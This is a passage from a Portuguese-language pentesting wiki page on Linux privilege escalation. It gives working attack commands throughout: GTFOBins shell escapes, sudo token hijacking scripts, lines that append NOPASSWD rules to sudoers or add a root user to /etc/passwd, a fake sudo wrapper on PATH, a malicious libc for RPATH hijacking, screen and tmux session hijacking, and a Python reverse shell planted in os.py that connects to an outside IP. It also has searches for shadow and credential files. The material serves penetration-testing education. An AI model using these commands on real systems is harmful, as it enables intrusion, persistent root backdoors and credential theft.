isso significa que a library que você gerou precisa ter uma function chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista organizada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você pode **injetar apenas argumentos** em um comando.

O projeto reúne funções legítimas de binários Unix que podem ser abusadas para escapar de restricted shells, escalar ou manter privilégios elevados, transferir arquivos, iniciar bind e reverse shells e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você puder acessar `sudo -l`, poderá usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra uma forma de explorar alguma sudo rule.

### Reutilizando Sudo Tokens

Nos casos em que você tem **sudo access**, mas não tem a senha, pode escalar privilégios **aguardando a execução de um comando sudo e depois sequestrando o session token**.

Requisitos para escalar privilégios:

- Você já tem uma shell como o usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do sudo token que permite usar `sudo` sem inserir nenhuma senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você pode conseguir fazer upload dele)

(Você pode habilitar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificando permanentemente `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o sudo token na sua sessão** (você não obterá automaticamente uma root shell; execute `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **pertencente ao root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- O **terceiro exploit** (`exploit_v3.sh`) **criará um arquivo sudoers** que torna os **tokens do sudo eternos e permite que todos os usuários usem o sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, poderá usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um sudo token para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com o PID 1234, poderá **obter privilégios de sudo** sem precisar saber a senha executando:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você puder **ler** este arquivo, poderá **obter algumas informações interessantes** e, se puder **escrever** em qualquer arquivo, poderá **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, pode abusar desta permissão.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra forma de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como `doas` para OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
Se o `doas` permitir um editor ou interpretador, verifique escapes no estilo GTFOBins:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Se você sabe que um **usuário geralmente se conecta a uma máquina e usa `sudo`** para escalar privilégios e obteve um shell no contexto desse usuário, pode **criar um novo executável sudo** que executará seu código como root e, em seguida, o comando do usuário. Depois, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho em .bash_profile) para que, quando o usuário executar sudo, seu executável sudo seja executado.

Observe que, se o usuário usar um shell diferente (não bash), será necessário modificar outros arquivos para adicionar o novo caminho. Por exemplo, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Normalmente, esse arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta indicada no arquivo de configuração dentro de `/etc/ld.so.conf.d/*.conf`, ele poderá conseguir escalar privilégios.\
Veja **como explorar essa configuração incorreta** na página a seguir:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa nesse local, conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma biblioteca maliciosa em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

As capabilities do Linux fornecem um **subconjunto dos privilégios root disponíveis a um processo**. Isso efetivamente divide os **privilégios root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente aos processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a página a seguir para **saber mais sobre capabilities e como abusar delas**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Permissões de diretórios

Em um diretório, o **bit de "execute"** implica que o usuário afetado pode usar "**cd**" para entrar na pasta.\
O bit de **"read"** implica que o usuário pode **listar** os **arquivos**, e o bit de **"write"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As Access Control Lists (ACLs) representam a camada secundária de permissões discricionárias, capazes de **substituir as permissões ugo/rwx tradicionais**. Essas permissões aprimoram o controle sobre o acesso a arquivos ou diretórios, permitindo ou negando direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade garante um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Conceda** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obtenha** arquivos com ACLs específicas do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor de ACL oculto em drop-ins do sudoers

Uma configuração incorreta comum é um arquivo pertencente ao root em `/etc/sudoers.d/` com o modo `440` que ainda concede acesso de escrita a um usuário com baixos privilégios por meio de ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Se você encontrar algo como `user:alice:rw-`, o usuário pode acrescentar uma regra do sudo apesar dos bits de modo restritivos:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Este é um caminho de persistência/privesc de alto impacto usando ACLs, pois é fácil não detectá-lo em revisões que usam apenas `ls -l`.

## Abrir sessões shell

Em **versões antigas**, você pode **sequestrar** alguma sessão **shell** de outro usuário (**root**).\
Nas **versões mais recentes**, você poderá **conectar-se** apenas às sessões screen do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### Sequestro de sessões screen

**Listar sessões screen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Localizações dos sockets (alguns sistemas expõem um como symlink do outro): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Attach a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Isso era um problema com **old tmux versions**. Não consegui fazer o hijacking de uma sessão tmux (v2.1) criada pelo root como um usuário sem privilégios.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Localizações dos sockets (alguns sistemas expõem um como symlink do outro) - tmux sessions hijacking: tmux -S /tmp/dev sess ls List usando esse socket, você pode iniciar uma sessão tmux nesse socket...](<../../images/image (837).png>)

**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Confira **Valentine box from HTB** para ver um exemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu etc.) entre setembro de 2006 e 13 de maio de 2008 podem estar afetadas por esse bug.\
Esse bug ocorre ao criar uma nova chave SSH nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e, **tendo a chave pública SSH, você pode procurar a chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
- **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite o login em contas com senhas vazias. O padrão é `no`.

### Login control files

Esses arquivos influenciam quem pode fazer login e como:

- **`/etc/nologin`**: se estiver presente, bloqueia logins que não sejam de root e exibe sua mensagem.
- **`/etc/securetty`**: restringe onde o root pode fazer login (lista de permissões de TTY).
- **`/etc/motd`**: banner exibido após o login (pode vazar informações do ambiente ou detalhes de manutenção).

### PermitRootLogin

Especifica se o root pode fazer login usando SSH; o padrão é `no`. Os valores possíveis são:

- `yes`: o root pode fazer login usando senha e chave privada
- `without-password` ou `prohibit-password`: o root só pode fazer login com uma chave privada
- `forced-commands-only`: o root só pode fazer login usando uma chave privada e se as opções de comandos forem especificadas
- `no` : não

### AuthorizedKeysFile

Especifica os arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Ele pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (iniciados por `/`) ou **caminhos relativos ao home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indicará que, se você tentar fazer login com a chave **privada** do usuário "**testusername**", o SSH comparará a chave pública da sua chave com as chaves localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite **usar suas chaves SSH locais em vez de deixar chaves** (sem frases secretas!) armazenadas no seu servidor. Assim, você poderá fazer **jump** via SSH **para um host** e, a partir dele, fazer **jump para outro** host **usando** a **chave** localizada no seu **host inicial**.

Você precisa definir esta opção em `$HOME/.ssh.config` desta forma:
```
Host example.com
ForwardAgent yes
```
Observe que, se `Host` for `*`, sempre que o usuário acessar uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **substituir estas** **options** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você descobrir que o Forward Agent está configurado em um ambiente, leia a página a seguir, pois **você pode conseguir explorá-lo para escalar privilégios**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos Interessantes

### Arquivos de perfil

O arquivo `/etc/profile` e os arquivos dentro de `/etc/profile.d/` são **scripts executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de profile estranho for encontrado, você deverá verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, é recomendado **encontrar todos eles** e **verificar se você consegue lê-los** para descobrir **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, você pode encontrar **hashes de senhas** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Em seguida, adicione o usuário `hacker` e a senha gerada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Como alternativa, você pode usar as linhas a seguir para adicionar um usuário fictício sem senha.\
AVISO: isso pode reduzir a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nas plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`; além disso, `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então poderá modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o Tomcat for iniciado.

### Verificar diretórios

Os diretórios a seguir podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não poderá ler o último, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Arquivos em locais incomuns ou com proprietários incomuns
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos de DB do SQLite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binários no PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Arquivos da Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que é uma aplicação de código aberto usada para recuperar várias senhas armazenadas em um computador local com Windows, Linux e Mac.

### Logs

Se você consegue ler logs, talvez possa encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho for o log, mais interessante ele será (provavelmente).\
Além disso, alguns **logs de auditoria** configurados de forma "**ruim**" (backdoored?) podem permitir **registrar senhas** dentro dos logs de auditoria, conforme explicado nesta publicação: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs, o grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será realmente útil.

### Arquivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Busca/Regex de Creds Genéricas

Você também deve verificar arquivos que contenham a palavra "**password**" em seu **nome** ou dentro do **conteúdo**, além de verificar IPs e emails dentro de logs ou regexps de hashes.\
Não vou listar aqui como fazer tudo isso, mas, se tiver interesse, você pode verificar as últimas verificações que o [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos graváveis

### Python library hijacking

Se você sabe **de onde** um script Python será executado e **pode escrever dentro** dessa pasta ou **modificar bibliotecas Python**, pode modificar a biblioteca do sistema operacional e fazer um backdoor nela (se puder escrever no local onde o script Python será executado, copie e cole a biblioteca os.py).

Para **fazer um backdoor na biblioteca**, basta adicionar a seguinte linha ao final da biblioteca os.py (altere o IP e a PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do logrotate

Uma vulnerabilidade no `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai potencialmente obtenham privilégios elevados. Isso ocorre porque o `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar as permissões não apenas em _/var/log_, mas também em qualquer diretório onde a rotação de logs seja aplicada.

> [!TIP]
> Essa vulnerabilidade afeta o `logrotate` versão `3.18.0` e anteriores

Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx),** portanto, sempre que descobrir que pode alterar logs, verifique quem está gerenciando esses logs e se você pode escalar privilégios substituindo os logs por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário puder **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um script existente, então seu **sistema está comprometido**.

Os scripts de rede, como _ifcg-eth0_, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~carregados\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se houver **espaço em branco** no nome, o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Observe o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd e rc.d**

O diretório `/etc/init.d` contém **scripts** para o System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Eles podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciador de serviços** mais recente introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts do SysVinit ainda são utilizados junto com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.

O **systemd** surge como um gerenciador moderno de inicialização e serviços, oferecendo recursos avançados, como inicialização de daemons sob demanda, gerenciamento de automount e snapshots do estado do sistema. Ele organiza os arquivos em `/usr/lib/systemd/` para pacotes da distribuição e em `/etc/systemd/system/` para modificações dos administradores, simplificando o processo de administração do sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Os Android rooting frameworks normalmente fazem hook em uma syscall para expor funcionalidades privilegiadas do kernel a um manager em userspace. Uma autenticação fraca do manager (por exemplo, verificações de assinatura baseadas na ordem dos FD ou esquemas de senha inadequados) pode permitir que um app local se passe pelo manager e escale para root em dispositivos que já possuem root. Saiba mais e veja os detalhes da exploração aqui:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

A descoberta de serviços baseada em regex no VMware Tools/Aria Operations pode extrair um caminho de binário das linhas de comando dos processos e executá-lo com `-v` em um contexto privilegiado. Padrões permissivos (por exemplo, usando `\S`) podem corresponder a listeners preparados pelo atacante em locais graváveis (por exemplo, `/tmp/httpd`), levando à execução como root (CWE-426 Untrusted Search Path).

Saiba mais e veja aqui um padrão generalizado aplicável a outras stacks de discovery/monitoring:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
